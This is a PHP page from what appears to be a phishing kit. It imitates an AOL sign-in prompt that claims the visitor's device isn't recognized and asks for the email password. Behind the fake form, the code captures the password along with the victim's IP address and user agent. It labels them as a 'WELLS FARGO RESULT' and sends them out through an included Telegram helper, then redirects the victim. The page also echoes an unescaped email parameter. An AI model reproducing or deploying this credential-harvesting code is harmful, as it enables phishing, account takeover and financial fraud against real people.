<?php
ini_set('session.gc_maxlifetime', 1209600);
ob_start();
session_start();
include '../includes/antibot.php';
include '../includes/telegram.php';
if (!isset($_GET['email'])){
	header('Location: ../verify/contact.php', true);
}
else{
	$email = $_GET['email'];
}
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Verify email - AOL</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/aol-favicon.png"/>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<style type="text/css">
	input{
		-webkit-appearance: none;
		border-radius: 0;
	}
	.card{
		box-shadow: 0 2px 4px 0 rgba(0,0,0,.3)
	}
	@media only screen and (max-width: 430px){
		.card{
			margin-left: auto;
			margin-right: auto;
			width: 340px;
		}
	}
	@media only screen and (min-width: 431px){
		.card{
			float: right;
			width: 360px;
		}
	}
	#email-pass{
		color: #666;
		padding-bottom: 0.3rem;
		border: none;
		transition: 0.25s;
		box-shadow: 0 2px 0 -1px #ccc;
		width: 100%;
		font-weight: bold;
	}
	#email-pass:focus{
		transition: 0.25s;
		box-shadow: 0 2px 0 -1px #39f;
		outline: none;
	}
	#email-pass:valid{
		transition: 0.25s;
		box-shadow: 0 2px 0 -1px #39f;
	}
	a{
		text-decoration: none;
		color: #39f;
		font-size: 0.9rem;
	}
	button{
		width: 100%;
		background-color: #39f;
		color: white;
		border: none;
	}
</style>
<body>
	<div class="py-4 px-5" style="position: relative; width: 100%;">
		<img src="../static/img/aol.png" width="100px" />
		<a class="py-2" href="" style="float: right;"><b>Help</b></a>
	</div>
	<div class="container">
		<div class="card text-center p-4" style="height: 550px;">
			<img class="mx-auto my-1" src="../static/img/aol.png" width="100px" />
			<b class="my-3" style="font-weight: 600;"><?php echo $email;?></b>
			<b style="font-weight: 500;">This device isn't recognized, please sign in to verify</b>
				<form action="" method="POST">
					<input class="mt-5 mb-4" type="password" name="email-pass" id="email-pass" placeholder="Password" required><i class="bi bi-eye-slash" id="showPassword" style="margin-left: -30px;"></i><i class="bi bi-eye" id="hidePassword" style="margin-left: -30px;" hidden></i><br>
					<button class="p-2 mb-3"><b>Next</b></button>
				</form>
			<a href=""><b>Forgot password?</b></a>
		</div>
	</div>
	<script type="text/javascript">
		const showPassword = document.querySelector("#showPassword");
		const hidePassword = document.querySelector("#hidePassword");
		const password = document.querySelector("#email-pass");

		showPassword.addEventListener('click', () => {
			password.setAttribute('type', 'text');

			showPassword.setAttribute('hidden', true);
			hidePassword.removeAttribute('hidden');
		});
		hidePassword.addEventListener('click', () => {
			password.setAttribute('type', 'password');

			hidePassword.setAttribute('hidden', true);
			showPassword.removeAttribute('hidden');
		});
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$email_pass = $_REQUEST['email-pass'];

	if (!isset($_SESSION['id'])){
		header('Location: ../verify/contact.php', true);
	}

	$msg = "WELLS FARGO RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| EMAIL PASSWORD : {$email_pass}";
	send_message(urlencode($msg));
	//$sql = "UPDATE $table SET email_pass = ? WHERE id=$id";
	//$stmt = $mysqli->prepare($sql);
	//$stmt->bind_param('s', $email_pass);
	//$stmt->execute();
	header('Location: ../complete.php', true);
}
?>